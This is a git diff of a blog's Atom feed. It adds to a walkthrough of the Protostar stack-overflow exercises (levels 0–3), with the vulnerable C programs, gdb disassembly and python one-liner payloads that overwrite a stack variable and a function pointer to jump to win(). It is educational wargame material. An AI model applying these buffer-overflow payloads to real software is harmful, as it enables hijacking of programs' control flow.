@@ -4,7 +4,7 @@
   <title><![CDATA[punMag]]></title>
   <link href="http://tungnh.github.io/atom.xml" rel="self"/>
   <link href="http://tungnh.github.io/"/>
-  <updated>2015-08-11T15:43:57+00:00</updated>
+  <updated>2015-08-11T16:03:12+00:00</updated>
   <id>http://tungnh.github.io/</id>
   <author>
     <name><![CDATA[Tung Pun]]></name>
@@ -68,7 +68,7 @@
 </span><span class='line'>}</span></code></pre></td></tr></table></div></figure></notextile></div>
 
 
-<p>Our goal is modify <code>modified</code>&rsquo;s value through <code>gets(buffer)</code> function. &ldquo;Sound fabulous, how can i change this variable&rsquo;s value when i cant touch it ?&rdquo;. However, when you use <a href="http://www.gnu.org/software/gdb/">gdb</a> to debug that file, you will recognize that <code>buffer</code>&rsquo;s address is just below <code>modified</code>&rsquo;s address in STACK. So, if we overload the <code>buffer</code>, the leftover will overwrite <code>modified</code> => the payload we need in this level is a string contains 70 * &lsquo;A&rsquo; (try more if you want).</p>
+<p>Our goal is modify <code>modified</code>&rsquo;s value through <code>gets(buffer)</code> function. &ldquo;Sound fabulous, how can i change this variable&rsquo;s value when i cant touch it ?&rdquo;. However, when you use <a href="http://www.gnu.org/software/gdb/">gdb</a> to debug that file, you will recognize that <code>buffer</code>&rsquo;s address is just below <code>modified</code>&rsquo;s address in STACK. So, if we overload the <code>buffer</code>, the leftover will overwrite <code>modified</code> => the payload we need in this level is a string contains 70 * <code>A</code> (try more if you want).</p>
 
 <h2>STACK 1</h2>
 
@@ -124,8 +124,8 @@
 </span><span class='line'>}</span></code></pre></td></tr></table></div></figure></notextile></div>
 
 
-<p>Not only overload <code>buffer</code>, we need make <code>modified</code>&rsquo;s value same as <code>0x61626364</code> (equal to <code>'abcd'</code> in ascii).
-Cuz the execute environment belongs to little endiance system, so you must <code>pack('&lt;I', targetvalue)</code></p>
+<p>Not only overload <code>buffer</code>, we need make <code>modified</code>&rsquo;s value same as <code>0x61626364</code> (equal to <code>abcd</code> in ascii).
+Cuz the execute environment belongs to Little Endiance system, so you must <code>pack('&lt;I', targetvalue)</code></p>
 
 <div class='bogus-wrapper'><notextile><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 <span class='line-number'>2</span>
@@ -135,16 +135,172 @@ Cuz the execute environment belongs to little endiance system, so you must <code
 
 <h2>STACK 2</h2>
 
+<div class='bogus-wrapper'><notextile><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>include &lt;stdlib.h&gt;
+</span><span class='line'>#include &lt;unistd.h&gt;
+</span><span class='line'>#include &lt;stdio.h&gt;
+</span><span class='line'>#include &lt;string.h&gt;
+</span><span class='line'>
+</span><span class='line'>int main(int argc, char **argv)
+</span><span class='line'>{
+</span><span class='line'>  volatile int modified;
+</span><span class='line'>  char buffer[64];
+</span><span class='line'>  char *variable;
+</span><span class='line'>
+</span><span class='line'>  variable = getenv("GREENIE");
+</span><span class='line'>
+</span><span class='line'>  if(variable == NULL) {
+</span><span class='line'>      errx(1, "please set the GREENIE environment variable\n");
+</span><span class='line'>  }
+</span><span class='line'>
+</span><span class='line'>  modified = 0;
+</span><span class='line'>
+</span><span class='line'>  strcpy(buffer, variable);
+</span><span class='line'>
+</span><span class='line'>  if(modified == 0x0d0a0d0a) {
+</span><span class='line'>      printf("you have correctly modified the variable\n");
+</span><span class='line'>  } else {
+</span><span class='line'>      printf("Try again, you got 0x%08x\n", modified);
+</span><span class='line'>  }
+</span><span class='line'>
+</span><span class='line'>}</span></code></pre></td></tr></table></div></figure></notextile></div>
+
+
 <p>Instead of reading buffer from keyboard, this level require <code>GREENIE</code> environment variable. We use <code>export</code> command in Linux</p>
 
 <div class='bogus-wrapper'><notextile><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 <span class='line-number'>2</span>
 <span class='line-number'>3</span>
 <span class='line-number'>4</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>➜  bin  GREENIE=`python2 -c 'print "A" * 64 + "\x0a\x0d\x0a\x0d"'`
-</span><span class='line'>➜  bin  export GREENIE
-</span><span class='line'>➜  bin  ./stack2
+</pre></td><td class='code'><pre><code class=''><span class='line'>➜  GREENIE=`python2 -c 'print "A" * 64 + "\x0a\x0d\x0a\x0d"'`
+</span><span class='line'>➜  export GREENIE
+</span><span class='line'>➜  ./stack2
 </span><span class='line'>you have correctly modified the variable</span></code></pre></td></tr></table></div></figure></notextile></div>
+
+
+<h2>STACK 3</h2>
+
+<div class='bogus-wrapper'><notextile><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>#include &lt;stdlib.h&gt;
+</span><span class='line'>#include &lt;unistd.h&gt;
+</span><span class='line'>#include &lt;stdio.h&gt;
+</span><span class='line'>#include &lt;string.h&gt;
+</span><span class='line'>
+</span><span class='line'>void win()
+</span><span class='line'>{
+</span><span class='line'>  printf("code flow successfully changed\n");
+</span><span class='line'>}
+</span><span class='line'>
+</span><span class='line'>int main(int argc, char **argv)
+</span><span class='line'>{
+</span><span class='line'>  volatile int (*fp)();
+</span><span class='line'>  char buffer[64];
+</span><span class='line'>
+</span><span class='line'>  fp = 0;
+</span><span class='line'>
+</span><span class='line'>  gets(buffer);
+</span><span class='line'>
+</span><span class='line'>  if(fp) {
+</span><span class='line'>      printf("calling function pointer, jumping to 0x%08x\n", fp);
+</span><span class='line'>      fp();
+</span><span class='line'>  }
+</span><span class='line'>}</span></code></pre></td></tr></table></div></figure></notextile></div>
+
+
+<p>In the end of this piece of code, the program call the function which has address stored in  <code>fp</code>&rsquo;s value. So, how to force the program call win function ? The first thought is overwrite   <code>win</code>&rsquo;s address to <code>fp</code> value.</p>
+
+<p>What is <code>win</code>&rsquo;s address ?</p>
+
+<p>Using gdb (with <a href="https://github.com/longld/peda">peda</a>) we have:</p>
+
+<div class='bogus-wrapper'><notextile><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>➜  gdb -q stack3
+</span><span class='line'>Reading symbols from stack3...done.
+</span><span class='line'>gdb-peda$ disass win
+</span><span class='line'>Dump of assembler code for function win:
+</span><span class='line'>   0x08048424 &lt;+0&gt;:     push   ebp
+</span><span class='line'>   0x08048425 &lt;+1&gt;:     mov    ebp,esp
+</span><span class='line'>   0x08048427 &lt;+3&gt;:     sub    esp,0x18
+</span><span class='line'>   0x0804842a &lt;+6&gt;:     mov    DWORD PTR [esp],0x8048540
+</span><span class='line'>   0x08048431 &lt;+13&gt;:    call   0x8048360 &lt;puts@plt&gt;
+</span><span class='line'>   0x08048436 &lt;+18&gt;:    leave
+</span><span class='line'>   0x08048437 &lt;+19&gt;:    ret
+</span><span class='line'>End of assembler dump.
+</span><span class='line'>gdb-peda$</span></code></pre></td></tr></table></div></figure></notextile></div>
+
+
+<p>So <code>win</code>&rsquo;s address is <code>0x08048424</code>. Now, we will build a payload, which contains 64 &lsquo;A&rsquo; characters and <code>0x08048424</code> in Little Endiance.</p>
+
+<div class='bogus-wrapper'><notextile><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>➜  python2 -c 'print "A" * 64 + "\x24\x84\x04\x08"' &gt; input3.b
+</span><span class='line'>➜  ./stack3 &lt; input3.b
+</span><span class='line'>calling function pointer, jumping to 0x08048424
+</span><span class='line'>code flow successfully changed</span></code></pre></td></tr></table></div></figure></notextile></div>
 
 
 
